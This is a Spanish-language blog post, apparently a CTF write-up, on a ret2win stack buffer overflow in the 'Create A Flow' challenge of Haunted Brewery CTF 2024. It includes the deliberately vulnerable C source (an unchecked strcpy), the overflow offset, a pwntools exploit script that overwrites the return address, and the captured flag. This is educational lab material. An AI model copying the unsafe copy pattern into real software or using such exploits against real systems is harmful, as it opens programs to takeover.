---
layout: post
title: Create A Flow Haunted Brewery CTF
comments: true
categories: [Pwn, Writeups, HauntedBreweryCTF]
---

Este fin de semana he participado con algunos miembros de mi equipo [Caliphal Hounds](https://ctftime.org/team/225933) en el [Haunted Brewery CTF 2024](https://ctftime.org/ctf/1191/). Donde logramos un puesto 20, dejando buenas sensaciones con el progreso del equipo.

En la competición tuvimos categoría de PWN, donde por desgracia sólo pudimos resolver este primer ejercicio, ya que para progresar debíamos resolver los retos anteriores, y nos atascamos en el segundo ejercicio (una especie de Jail).

![Image]({{ site.baseurl }}/images/posts/haunted-brewery-2024.png)

# Overview

Como viene siendo costumbre en los últimos CTFs, este también es un ret2win, con la particularidad de que la conexión al servicio no se realiza por *netcat*, sino mediante *snicat* (una herramienta similar a netcat pero con soporte para cifrado SSL).

Por lo demás, se nos da un archivo fuente en C:

```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <time.h>
// gcc -o create-a-flow create-a-flow.c -fno-stack-protector -z execstack -no-pie -m32 

[...]

void unlock_secret() {
    printf("\n👻 y..o..u... s...hou...d...nt.. be ... hee...e.r...e... GET OUT! 👻\n");
    printf("The fermenter starts shaking... !\n");
    printf("You hear a faint sound shimmer across your ears...\n");
    printf("t..h..e.... f...lag... is.: HnH{connect-to-the-sever-and-run-your-exploit}\n "); 

}

void submit_brew(char *brew_name) {
    char buffer[32];

    printf("Sending data ..... : %s\n", brew_name);

    strcpy(buffer, brew_name);  //Vulnerable a BOF, buffer[32] <= brew_name[128]

}

int main() {

    ignore_me_init_buffering(); 
    char brew_name[128];

    const char *goodbye_messages[] = {
        "Thanks for brewing up that awesome suggestion! We'll take it from here.",
        [...]
    };

    int message_count = sizeof(goodbye_messages) / sizeof(goodbye_messages[0]);

    srand(time(NULL));

    int random_goodbye_index = rand() % message_count;


    printf("Welcome to the Haunted Brewery Brew-Curation tank. If we like the name of your brew, we'll feature it in the next batch! \n");
    printf("Enter the name of your cursed brew to have it submitted to our staff: ");

    fgets(brew_name, sizeof(brew_name), stdin); 

    brew_name[strcspn(brew_name, "\n")] = 0;

    printf("\nSubmission in progress...\n");
    submit_brew(brew_name);

    printf("%s\n", goodbye_messages[random_goodbye_index]);
   
    exit(0); 
}
```

Lo que nos interesa es la línea de compilación:

```bash
gcc -o create-a-flow create-a-flow.c -fno-stack-protector -z execstack -no-pie -m32 
```

Aquí vemos que se está compilando con 32 bits, además de que no tendrá protecciones. Por otro lado, en el propio código vemos una función `unlock_secret` que nos imprimirá la flag, pero que no se referencia en ningún lugar del código.

Para lograr llamar a la función deberemos desbordar el buffer de la función `submit_brew` que es vulnerable a *Buffer Overflow* (dado que dipone de 32b pero de le está cargando `brew_name` de 128).

# Explotación

Como siempre, utilizamos *cyclic* para encontrar el offset hasta el RIP (no incluyo esta parte dado que es algo básico que hemos hecho en otros writeups), que en este caso es 44. Con *gdb* obtenemos la dirección de `unlock_secret` y con esa información ya popdemos crear nuestro script:

```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *

## ./sc -bind 5000 hackersnhops-create-a-flow.chals.io

win = p32(0x08049253)
padding = 44 * b'A'

io = remote("127.0.0.1", 5000)
#io = pwn.connect(hostAddress, 443, ssl=True, sni=hostAddress)

payload = padding
payload += win

io.sendlineafter(":", payload)

io.interactive()
```

Antes de ejecutarlo, debemos lanzar el siguiente comando:

```bash
./sc -bind 5000 hackersnhops-create-a-flow.chals.io
```

De esta forma, las conexión viajará a través de *snicat*. Y una vez hecho esto deberíamos obtener la flag:

```

👻 y..o..u... s...hou...d...nt.. be ... hee...e.r...e... GET OUT! 👻
The fermenter starts shaking... !
You hear a faint sound shimmer across your ears...
t..h..e.... f...lag... is.: HnH{Gh0st1nThe13uFf3r}
```

Como dije en anteriores posts, está muy bien que haya retos de la categoría en las competiciones, sin embargo, sería interesante ver conceptos nuevos o incorporar algún nivel extra de complejidad.

Sin más, si te ha gustado el post, puedes ver el resto de post que subiré de ésta competición!